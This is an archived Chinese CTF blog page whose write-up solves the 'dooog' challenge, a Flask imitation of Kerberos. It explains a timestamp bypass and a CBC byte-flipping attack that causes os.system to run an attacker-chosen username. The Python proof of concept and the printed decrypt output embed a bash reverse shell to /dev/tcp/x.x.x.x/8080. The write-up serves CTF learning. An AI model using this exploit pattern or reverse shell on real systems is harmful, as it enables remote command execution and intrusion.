@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <title>
+        高校抗疫CTF dooog write up - Naivekun&#39;s blog
+      </title>
+    <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  
+  <meta name="theme-color" content="#000000" />
+  
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <meta name="description" content="0x00 dooog 看下源码，给了三个flask搞得server，一个client一个kdc一个cmdserver 出题人用python模拟了一个Kerber" />
+  <meta name="generator" content="Hugo 0.70.0 with theme pure" />
+  <title>高校抗疫CTF dooog write up - Naivekun&#39;s blog</title>
+  
+  
+  <link rel="stylesheet" href="https://naivekun.com/css/style.min.7dc20efbc53647d41aa9ddea0c48e59300223d084e66ea0cbe7c30bd88903acc.css">
+  
+  <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css" async>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+  <meta property="og:title" content="高校抗疫CTF dooog write up" />
+<meta property="og:description" content="0x00 dooog 看下源码，给了三个flask搞得server，一个client一个kdc一个cmdserver 出题人用python模拟了一个Kerber" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://naivekun.com/2020/03/ctf-202003-dooog/" />
+<meta property="article:published_time" content="2020-03-14T00:20:37+00:00" />
+<meta property="article:modified_time" content="2020-03-14T00:20:37+00:00" />
+<meta itemprop="name" content="高校抗疫CTF dooog write up">
+<meta itemprop="description" content="0x00 dooog 看下源码，给了三个flask搞得server，一个client一个kdc一个cmdserver 出题人用python模拟了一个Kerber">
+<meta itemprop="datePublished" content="2020-03-14T00:20:37&#43;00:00" />
+<meta itemprop="dateModified" content="2020-03-14T00:20:37&#43;00:00" />
+<meta itemprop="wordCount" content="1106">
+
+
+
+<meta itemprop="keywords" content="ctf," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="高校抗疫CTF dooog write up"/>
+<meta name="twitter:description" content="0x00 dooog 看下源码，给了三个flask搞得server，一个client一个kdc一个cmdserver 出题人用python模拟了一个Kerber"/>
+
+  <!--[if lte IE 9]>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+    <![endif]-->
+
+  <!--[if lt IE 9]>
+      <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+      <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+    <![endif]-->
+
+</head>
+  </head>
+
+  
+  
+
+  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          <a id="avatar" href="https://github.com/naivekun" target="_blank">
+            <img class="img-circle img-rotate" src="https://naivekun.com/avatar.jpg" width="200" height="200">
+          </a>
+          <h2 id="name" class="hidden-xs hidden-sm">naivekun</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTFer</h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Wuhan, China</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="Type something..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Archives</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-categories">
+                <a href="/categories/">
+                    <i class="icon icon-folder"></i>
+                  <span class="menu-title">Categories</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-friends">
+                <a href="/friends/">
+                    <i class="icon icon-friendship"></i>
+                  <span class="menu-title">Friends</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-about">
+                <a href="/about/">
+                    <i class="icon icon-cup-fill"></i>
+                  <span class="menu-title">About</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content"><script src="https://www.hackthebox.eu/badge/60818"></script>
+            </div>
+        </div>
+    </div>
+</div>
+
+      <div class="widget">
+    <h3 class="widget-title"> Categories</h3>
+    <div class="widget-body">
+        <ul class="category-list">
+            <li class="category-list-item"><a href="https://naivekun.com/categories/ctf/" class="category-list-link">ctf</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://naivekun.com/categories/hackthebox/" class="category-list-link">hackthebox</a><span class="category-list-count">13</span></li>
+            <li class="category-list-item"><a href="https://naivekun.com/categories/vulnhub/" class="category-list-link">vulnhub</a><span class="category-list-count">21</span></li>
+        </ul>
+    </div>
+</div>
+      <div class="widget">
+    <h3 class="widget-title"> Tags</h3>
+    <div class="widget-body">
+        <ul class="tag-list">
+            
+            
+            <li class="tag-list-item"><a href="https://naivekun.com/tags/ctf/" class="tag-list-link">ctf</a><span
+                    class="tag-list-count">2</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://naivekun.com/tags/hackthebox/" class="tag-list-link">hackthebox</a><span
+                    class="tag-list-count">13</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://naivekun.com/tags/vulnhub/" class="tag-list-link">vulnhub</a><span
+                    class="tag-list-count">21</span></li>
+            
+        </ul>
+
+    </div>
+</div>
+      
+<div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2021/12/ma5671a-flash-openwrt/" class="title">68块钱MA5671A猫棒刷Openwrt</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-12-09 02:46:52 &#43;0800 &#43;0800" itemprop="datePublished">2021-12-09</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/10/hack-on-nrf/" class="title">nRF51系列单片机读取保护绕过</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-10-03 23:58:09 &#43;0800 &#43;0800" itemprop="datePublished">2020-10-03</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/08/hack-bmc/" class="title">一次对服务器主板IPMI BMC的漏洞挖掘</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-08-19 01:58:07 &#43;0800 &#43;0800" itemprop="datePublished">2020-08-19</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/07/tn3399-more/" class="title">TN3399板子填坑</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-07-23 18:03:36 &#43;0800 &#43;0800" itemprop="datePublished">2020-07-23</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/07/tn3399/" class="title">闲鱼便宜板子TN3399折腾全攻略</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-07-14 16:51:10 &#43;0800 &#43;0800" itemprop="datePublished">2020-07-14</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">Catalogue</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+<main class="main" role="main"><div class="content">
+  <article id="-" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h1 itemprop="name">
+  <a
+    class="article-title"
+    href="/2020/03/ctf-202003-dooog/"
+    >高校抗疫CTF dooog write up</a
+  >
+</h1>
+
+      <div class="article-meta">
+        
+<span class="article-date">
+  <i class="icon icon-calendar-check"></i>&nbsp;
+<a href="https://naivekun.com/2020/03/ctf-202003-dooog/" class="article-date">
+  <time datetime="2020-03-14 00:20:37 &#43;0000 UTC" itemprop="datePublished">2020-03-14</time>
+</a>
+</span>
+  
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>&nbsp;
+    <a class="article-tag-link" href="/tags/ctf/"> ctf </a>
+  </span>
+
+        <span class="post-comment"><i class="icon icon-comment"></i>&nbsp;<a href="/2020/03/ctf-202003-dooog/#comments"
+            class="article-comment-link">Comments</a></span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 1106words</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 3minutes </span>
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <h2 id="0x00-dooog">0x00 dooog</h2>
+<p>看下源码，给了三个flask搞得server，一个client一个kdc一个cmdserver</p>
+<p>出题人用python模拟了一个Kerberos认证的服务。<del>真是日了狗了</del></p>
+<p>借个图</p>
+<p><img src="/images/2020-03-14-00-44-31.png" alt=""></p>
+<p>Kerberos认证分三步</p>
+<ol>
+<li>从AS拿TGT</li>
+<li>用TGT从TGS拿服务票据</li>
+<li>拿服务票据去访问服务</li>
+</ol>
+<p>读一下源码大概画了个图</p>
+<p>emmmmmm字丑，不重要不重要（</p>
+<p>蓝线是加密。绿线是解密。彩色线是对比</p>
+<p>KDC</p>
+<p><img src="/images/2020-03-14-003858.png" alt=""></p>
+<p>Service</p>
+<p><img src="/images/2020-03-14-004831.png" alt=""></p>
+<p>这里有限制，TGS会判断cmd是否是whoami或者ls，然后拿服务账号的master_key加密</p>
+<p><img src="/images/2020-03-14-00-54-25.png" alt=""></p>
+<h4 id="第一种做法">第一种做法</h4>
+<p>看到这里
+<img src="/images/2020-03-14-00-50-54.png" alt=""></p>
+<p>而TGT里面没有时间，这个client给的auth是可控的</p>
+<p>所以直接把时间减小，<del>多出的送给某位老人</del>，即可跳过TGS对cmd的限制</p>
+<p>然而我不是这么做的。。。想麻烦了</p>
+<h4 id="第二种做法">第二种做法</h4>
+<p>当时觉得把字符串用<code>|</code>拼成一块再split很蠢，里面如果某个参数可控，插一个<code>|</code>就让他gg了。</p>
+<p>尝试在user里面插<code>|</code>，但是在TGS那里直接挂逼，它要三个username对的上才行，但是TGT里面那个控制不了，是拿KDC的key加密的。</p>
+<p>然后看了一下它很蛇皮的AES-CBC实现</p>
+<p>？？？发现pad炸了都不报错的？？？</p>
+<p>然后看了下cmdserver的实现</p>
+<pre><code>    msg = cryptor.decrypt(base64.b64decode(server_message)).split('|')
+    session_key = msg[0]
+    cryptor = AESCipher(session_key)
+    username = cryptor.decrypt(base64.b64decode(authenticator))
+    if username == msg[1]:
+        print(&quot;[+] system:&quot;,msg[2])
+        os.system(msg[2])
+        return 'execute success'
+</code></pre>
+<p>这个server_message是用服务账号加密的，里面是用<code>|</code>隔开的三个参数，session_key和username和cmd</p>
+<p>然后用session_key去解密客户端发来的另一个参数auth，得到用户名。和上面的第二个用户名对比，ok了就执行命令</p>
+<p><img src="/images/2020-03-14-004831.png" alt=""></p>
+<p>就是上面那个图</p>
+<p>发现session_key长度是32，那么想要靠split来控制cmd,必须要让session_key或者user其中之一插入一个<code>|</code></p>
+<p>但是前文说了改username过不了TGS那个split，session_key又改不了。</p>
+<p>然后突然想到了那个蛇皮的Padding实现，如果解密出错应该返回一个空字符串，如果让server_msg里面的user也是空字符串，就可以通过用户名验证。</p>
+<p>所以用CBC字节反转，把session_key第31位也变成<code>|</code></p>
+<p>传入的server_msg解密之后就是这样</p>
+<pre><code>('cmd_server decrypt', '{\xba`\xff\x00)GW\n\xd6\x8fKG\xe1\x93\xaf05fe301bacb7ff2||bash -c &quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/8080 0&gt;&amp;1&quot;|whoami')
+</code></pre>
+<p>前16个字节被搞乱了，不过无所谓</p>
+<p>这一大坨乱码去解密auth肯定解不了，然后返回一个空串</p>
+<p><img src="/images/2020-03-14-01-12-37.png" alt=""></p>
+<p>然后user和msg[1]都是空串，真实的user被当成cmd执行了</p>
+<p><img src="/images/2020-03-14-01-13-42.png" alt=""></p>
+<p>然后就日了狗狗狗了（</p>
+<p>POC</p>
+<pre><code class="language-python">from toolkit import AESCipher
+import json
+import time
+import base64
+import requests
+
+username=&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/8080 0&gt;&amp;1\&quot;&quot;
+master_key=&quot;naivekun123&quot;
+cmd=&quot;whoami&quot;
+
+#register
+r=requests.post(&quot;http://127.0.0.1:5001/register&quot;,data={&quot;username&quot;:username, &quot;master_key&quot;:master_key})
+print(&quot;register&quot;,r.text)
+
+cryptor = AESCipher(master_key)
+
+authenticator = cryptor.encrypt(json.dumps({'username':username, 'timestamp': int(time.time())}))
+res = requests.post('http://127.0.0.1:5001/getTGT', data={'username': username, 'authenticator': base64.b64encode(authenticator)})
+print(&quot;[+] res:&quot;,res.text)
+
+session_key, TGT = cryptor.decrypt(base64.b64decode(res.content.decode().split('|')[0])), res.content.decode().split('|')[1]
+print(session_key, TGT)
+
+cryptor = AESCipher(session_key)
+authenticator = cryptor.encrypt(json.dumps({'username': username, 'timestamp': int(time.time())}))
+import base64
+data={'username': username, 'cmd': cmd, 'authenticator': base64.b64encode(authenticator), &quot;TGT&quot;:TGT}
+print(data)
+res = requests.post('http://127.0.0.1:5001/getTicket',  data={'username': username, 'cmd': cmd, 'authenticator': base64.b64encode(authenticator), 'TGT': TGT})
+print(&quot;[+] res&quot;,res.content)
+
+client_message, server_message = res.text.split('|')
+session_key = cryptor.decrypt(base64.b64decode(client_message))
+cryptor = AESCipher(session_key)
+
+username='a'
+authenticator = base64.b64encode(cryptor.encrypt(username))
+
+
+#  cbc
+# 536ff702b2166e5a
+# a0fb499d7d531d27
+# |naivedog|whoami
+
+server_message = base64.b64decode(server_message.encode())
+
+offset = 15
+print(&quot;original:&quot;,server_message)
+new_server_msg = server_message[:offset] + bytes([server_message[offset]^session_key[offset+16]^ord(&quot;|&quot;)])+server_message[offset+1:]
+print(&quot;post:&quot;,new_server_msg)
+
+new_server_msg = base64.b64encode(new_server_msg).decode()
+
+res = requests.post('http://127.0.0.1:5002/cmd', data={'server_message': new_server_msg, 'authenticator': authenticator})
+print(res.text)
+
+</code></pre>
+
+    </div>
+    <div class="article-footer">
+<blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    <li class="post-copyright-link hidden-xs">
+      <strong>Permalink: </strong>
+      <a href="https://naivekun.com/2020/03/ctf-202003-dooog/" title="高校抗疫CTF dooog write up" target="_blank" rel="external">https://naivekun.com/2020/03/ctf-202003-dooog/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>License：</strong><a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
+    </li>
+  </ul>
+</blockquote>
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/naivekun" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="https://naivekun.com/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/naivekun" target="_blank"><span class="text-dark">naivekun</span><small class="ml-1x">CTFer</small></a></h3>
+        <div>Web/Pentest/Android</div>
+      </div>
+    </figure>
+  </div>
+</div>
+    </div>
+  </article>
+<section id="comments">
+</section>
+
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="https://naivekun.com/2019/09/a-awd-at-2019-8-31/" title="20190831记一次AWD"><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;Older</span></a>
+            </li>
+            <li class="next">
+                <a href="https://naivekun.com/about/"
+                    title="About"><span>Newer&nbsp;&nbsp;</span><i
+                        class="icon icon-angle-right" aria-hidden="true"></i></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="Catalogue" role="button">
+                    <span>[&nbsp;</span><span>Catalogue</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        
+        <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal"
+            data-target="#donateModal"><span>$</span></button>
+        
+        <div class="bar-right">
+        </div>
+    </div>
+</nav>
+
+
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+    <div class="modal-dialog" role="document">
+        <div class="modal-content donate">
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span
+                    aria-hidden="true">&times;</span></button>
+            <div class="modal-body">
+                <div class="donate-box">
+                    <div class="donate-head">
+                        <p>Maybe you could buy me a cup of coffee.</p>
+                    </div>
+                    <div class="tab-content">
+                        <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+                            <div class="donate-payimg">
+                                <img src="https://naivekun.com/donate/alipayimg.png"
+                                    alt="Scan Qrcode" title="Scan" />
+                            </div>
+                            <p class="text-muted mv">Scan this qrcode</p>
+                            <p class="text-grey">Open alipay app scan this qrcode, buy me a coffee!</p>
+                        </div>
+                        <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+                            <div class="donate-payimg">
+                                <img src="https://naivekun.com/donate/wechatpayimg.png"
+                                    alt="Scan Qrcode" title="Scan" />
+                            </div>
+                            <p class="text-muted mv">Scan this qrcode</p>
+                            <p class="text-grey">Open wechat app scan this qrcode, buy me a coffee!</p>
+                        </div>
+                    </div>
+                    <div class="donate-footer">
+                        <ul class="nav nav-tabs nav-justified" role="tablist">
+                            <li role="presentation" class="active">
+                                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay"
+                                    aria-expanded="true"><i class="icon icon-alipay"></i> alipay</a>
+                            </li>
+                            <li role="presentation" class="">
+                                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab"
+                                    aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i>
+                                    wechat payment</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+<ul class="social-links">
+    <li><a href="https://github.com/naivekun" target="_blank" title="github" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-github"></i></a></li>
+    <li><a href="https://naivekun.com/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-rss"></i></a></li>
+</ul>
+  <div class="copyright">
+    &copy;&nbsp;2018  -
+    2021
+    <div class="publishby">
+        Theme by naivekun base on<a href="https://github.com/xiaoheiAh/hugo-theme-pure" target="_blank"> pure</a>.
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/python.min.js" defer></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/javascript.min.js" defer></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="https://naivekun.com/js/application.min.bdeb64b910570b6c41badc6a05b7afb0c8ad9efd8525de3c7257d59e786326a3.js"></script>
+<script src="https://naivekun.com/js/plugin.min.51ff8c7317566f82259170fa36e09c4493adc9b9378b427a01ad3f017ebac7dd.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            ROOT_URL: 'https:\/\/naivekun.com',
+            CONTENT_URL: 'https:\/\/naivekun.com\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="https://naivekun.com/js/insight.min.a343cd9a5a7698336b28ef3a7c16a3a1b1d2d5fb17dc8ed04022bbe08cc5459073a15bdafa3a8a58cdd56080784bdd69fa70b1ae8597565c799c57ed00f0e120.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+
+  </body>
+</html>
